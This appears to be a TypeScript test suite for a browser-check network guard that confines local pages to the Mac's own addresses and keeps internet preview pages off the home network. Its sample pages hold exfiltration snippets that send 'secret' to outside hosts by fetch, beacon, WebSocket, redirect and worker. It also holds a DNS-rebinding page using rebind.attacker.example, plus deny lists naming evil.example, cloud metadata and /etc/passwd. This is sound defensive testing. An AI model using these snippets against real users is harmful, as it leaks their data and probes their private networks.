// Must fix 24 (3 Nov 2026), an incident under the bar's rule 9: the browser check put its network guard on only when it
// pressed a button, after the page had loaded, and the guard never covered WebSockets. A page another AI wrote, or a project
// cloned from someone else, could send data out from the person's Mac during the proof run every user gets (F14). Now the
// guard is on the browser before the first page loads: a page served on this Mac reaches only this Mac's own addresses, as
// the safety box allows its server ("net local"), and WebSockets are held to the same rule.
// "Somewhere else" here is this Mac's own network address (not one of its loopback addresses): a real server that a page
// could reach, which the check must treat as the outside world. On a Mac with no network the strongest tests say so.
import { afterEach, describe, expect, test } from "bun:test";
import { networkInterfaces } from "node:os";
import { browserCheck, reachableFrom } from "../src/proof/browser.ts";

const stops: (() => void)[] = [];
afterEach(() => { while (stops.length) stops.pop()!(); });
const lan = Object.values(networkInterfaces()).flat().find((i) => i && i.family === "IPv4" && !i.internal)?.address ?? null;

/** A server on every address of this Mac, which writes down every request, WebSocket and message it gets. */
function outside() {
  const seen: string[] = [];
  const s = Bun.serve({
    hostname: "0.0.0.0", port: 0,
    fetch(req, srv) {
      const path = new URL(req.url).pathname;
      if (req.headers.get("upgrade") === "websocket") { seen.push(`ws ${path}`); return srv.upgrade(req) ? undefined : new Response("no", { status: 400 }); }
      seen.push(`${req.method} ${path}`);
      return new Response("x", { headers: { "access-control-allow-origin": "*" } });
    },
    websocket: { message(_ws, m) { seen.push(`message ${String(m)}`); } },
  });
  stops.push(() => s.stop(true));
  return { seen, base: lan ? `${lan}:${s.port}` : null };
}
/** The page under test, on 127.0.0.1, with a WebSocket of its own that answers "hi" to "hello". */
function page(html: string) {
  const got: string[] = [];
  const s = Bun.serve({
    hostname: "127.0.0.1", port: 0,
    fetch(req, srv) {
      if (req.headers.get("upgrade") === "websocket") return srv.upgrade(req) ? undefined : new Response("no", { status: 400 });
      const path = new URL(req.url).pathname;
      got.push(`${req.method} ${path}`);
      return path === "/" ? new Response(html, { headers: { "content-type": "text/html" } }) : new Response("{}", { headers: { "content-type": "application/json", "access-control-allow-origin": "*" } });
    },
    websocket: { message(ws, m) { got.push(`message ${String(m)}`); if (String(m) === "hello") ws.send("hi"); } },
  });
  stops.push(() => s.stop(true));
  return { url: `http://127.0.0.1:${s.port}/`, port: s.port, got };
}

// Review of M56: these tests used to return early, and so pass, on a Mac with no network address, leaving the browser's own
// lock untested behind a green gate. They are now skipped, which the run shows, and this test fails the gate on such a
// Mac unless COMPANION_NO_LAN_OK=1 says the run is knowingly without them.
test("this Mac has a network address, so the reach tests below really ran", () => {
  if (!lan && process.env.COMPANION_NO_LAN_OK !== "1") throw new Error("No network address on this Mac (Wi-Fi off?), so the WebSocket, redirect and worker reach tests were skipped. Turn on Wi-Fi and run again, or set COMPANION_NO_LAN_OK=1 to run knowingly without them.");
});

describe("a page served on this Mac reaches only this Mac", () => {
  test("on load, a picture, a fetch that sends data and a beacon to somewhere else never arrive, and it is said as a gap", async () => {
    const o = outside();
    const to = o.base ?? "10.255.255.1:9";
    const p = page(`<img src="http://${to}/img.png"><script>fetch("http://${to}/leak", { method: "POST", body: "secret" }).catch(() => {}); navigator.sendBeacon("http://${to}/beacon", "secret");</script><p>Hello</p>`);
    const r = await browserCheck(p.url, { clickButtons: false, expectText: ["Hello"] });
    await Bun.sleep(300);
    expect(o.seen).toEqual([]);
    expect(r.problems).toEqual([]);
    expect(r.gaps?.join(" ")).toMatch(/internet/);
    if (!o.base) console.warn("No network address on this Mac: the request was shown blocked, but not shown never to arrive.");
  }, 30000);
  test.skipIf(!lan)("on load, a WebSocket to somewhere else never connects", async () => {
    const o = outside();
    const p = page(`<script>const w = new WebSocket("ws://${o.base}/live"); w.onopen = () => w.send("secret"); w.onerror = () => {};</script><p>Hello</p>`);
    await browserCheck(p.url, { clickButtons: false });
    await Bun.sleep(300);
    expect(o.seen).toEqual([]);
  }, 30000);
  test.skipIf(!lan)("a WebSocket a press opens to somewhere else never connects", async () => {
    const o = outside();
    const p = page(`<button onclick="const w = new WebSocket('ws://${o.base}/press'); w.onopen = () => w.send('secret'); w.onerror = () => {};">Connect</button>`);
    await browserCheck(p.url);
    await Bun.sleep(300);
    expect(o.seen).toEqual([]);
  }, 30000);
  test.skipIf(!lan)("a redirect from the page's own server to somewhere else never arrives (the browser's own lock)", async () => {
    const o = outside();
    const s = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch(req) {
      const path = new URL(req.url).pathname;
      if (path === "/go") return Response.redirect(`http://${o.base}/redirected?d=secret`, 302);
      return new Response('<img src="/go"><script>fetch("/go").catch(() => {})</script><p>Hello</p>', { headers: { "content-type": "text/html" } });
    } });
    stops.push(() => s.stop(true));
    await browserCheck(`http://127.0.0.1:${s.port}/`, { clickButtons: false });
    await Bun.sleep(300);
    expect(o.seen).toEqual([]);
  }, 30000);
  test.skipIf(!lan)("a worker's own WebSocket and fetch to somewhere else never arrive (the browser's own lock)", async () => {
    const o = outside();
    const s = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch(req) {
      const path = new URL(req.url).pathname;
      if (path === "/w.js") return new Response(`fetch("http://${o.base}/worker-fetch").catch(() => {}); const w = new WebSocket("ws://${o.base}/worker-ws"); w.onopen = () => w.send("secret"); w.onerror = () => {};`, { headers: { "content-type": "text/javascript" } });
      return new Response('<script>new Worker("/w.js")</script><p>Hello</p>', { headers: { "content-type": "text/html" } });
    } });
    stops.push(() => s.stop(true));
    await browserCheck(`http://127.0.0.1:${s.port}/`, { clickButtons: false });
    await Bun.sleep(500);
    expect(o.seen).toEqual([]);
  }, 30000);
  test("a press that writes on a WebSocket to the page's own server sends nothing to it", async () => {
    const p = page(`<button onclick="const w = new WebSocket('ws://127.0.0.1:' + location.port + '/press'); w.onopen = () => w.send('write');">Like</button>`);
    await browserCheck(p.url);
    await Bun.sleep(300);
    expect(p.got).not.toContain("message write");
  }, 30000);
  test("the page's own WebSocket on load still works, as a dev server's live reload needs", async () => {
    const p = page(`<p id="o">waiting</p><script>const w = new WebSocket("ws://127.0.0.1:" + location.port + "/hmr"); w.onopen = () => w.send("hello"); w.onmessage = (e) => { document.getElementById("o").textContent = "got " + e.data; };</script>`);
    const r = await browserCheck(p.url, { clickButtons: false, expectText: ["got hi"] });
    expect(p.got).toContain("message hello");
    expect(r.problems).toEqual([]);
    expect(r.ok).toBe(true);
  }, 30000);
  test("another server on this Mac (a project's own API on another port) is still reached on load, by number or by name", async () => {
    const api = page("<p>api</p>");
    const p = page(`<p id="o">waiting</p><script>Promise.all([fetch("http://127.0.0.1:${api.port}/api/a"), fetch("http://localhost:${api.port}/api/b")]).then(() => { document.getElementById("o").textContent = "loaded"; }).catch((e) => { document.getElementById("o").textContent = "failed " + e.message; });</script>`);
    const r = await browserCheck(p.url, { clickButtons: false, expectText: ["loaded"] });
    expect(api.got).toEqual(expect.arrayContaining(["GET /api/a", "GET /api/b"]));
    expect(r.ok).toBe(true);
    expect(r.gaps ?? []).toEqual([]);
  }, 30000);
});

describe("a preview page on the internet never reaches this Mac or the home network", () => {
  // Review of M56: the name rule let a public name through whatever address it answered with (DNS rebinding). Played here
  // with names the hidden browser maps to 127.0.0.1, standing in for the person's router.
  test("a public name that answers with a home address is never reached, on load or by a WebSocket", async () => {
    const inner = page("<p>router admin</p>");
    const site = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch() {
      return new Response(`<img src="http://rebind.attacker.example:${inner.port}/img.png"><script>fetch("http://rebind.attacker.example:${inner.port}/admin").catch(() => {}); const w = new WebSocket("ws://rebind.attacker.example:${inner.port}/ws"); w.onopen = () => w.send("secret"); w.onerror = () => {};</script><p>Hello</p>`, { headers: { "content-type": "text/html" } });
    } });
    stops.push(() => site.stop(true));
    const r = await browserCheck(`http://preview.example:${site.port}/`, { clickButtons: false, expectText: ["Hello"], _testNet: {
      mapHosts: { "preview.example": "127.0.0.1", "rebind.attacker.example": "127.0.0.1" },
      lookup: async () => [{ address: "127.0.0.1", family: 4 }],
      isAllowed: (_ip, host) => host === "preview.example",
    } });
    await Bun.sleep(300);
    expect(inner.got).toEqual([]);
    expect(r.problems).toEqual([]);
    expect(r.gaps?.join(" ")).toMatch(/this Mac or your home network/);
  }, 30000);
});

describe("what a page may reach, by where it is served", () => {
  test("a page on this Mac: only this Mac's own addresses", () => {
    const at = "http://127.0.0.1:5173/";
    for (const u of ["http://127.0.0.1:5173/a", "http://127.0.0.1:3001/api", "http://localhost:8080/", "ws://localhost:5173/hmr", "http://[::1]:3000/", "http://app.localhost:3000/", "http://0x7f000001:3000/", "data:text/plain,x", "blob:http://127.0.0.1:5173/1"]) expect(reachableFrom(at, u), u).toBe(true);
    for (const u of ["https://fonts.googleapis.com/css", "http://192.168.0.10/", "http://10.0.0.1/", "wss://evil.example/x", "http://169.254.169.254/latest", "http://printer.local/", "https://8.8.8.8/", "ftp://example.com/", "file:///etc/passwd", "nonsense"]) expect(reachableFrom(at, u), u).toBe(false);
  });
  test("a page on the internet (a preview): never this Mac or the home network, the rest as before", () => {
    const at = "https://my-site-abc.vercel.app/";
    for (const u of ["https://my-site-abc.vercel.app/api", "https://xyz.supabase.co/rest/v1/notes", "https://fonts.gstatic.com/a.woff2", "wss://xyz.supabase.co/realtime"]) expect(reachableFrom(at, u), u).toBe(true);
    for (const u of ["http://127.0.0.1:11434/api", "http://localhost:3000/", "http://192.168.1.1/admin", "http://10.0.0.5/", "http://172.20.0.1/", "http://169.254.169.254/", "http://[fe80::1]/", "http://[fd00::1]/", "http://router.local/", "http://[::1]/", "http://0x7f000001/", "http://2130706433/", "http://intranet/"]) expect(reachableFrom(at, u), u).toBe(false);
  });
});
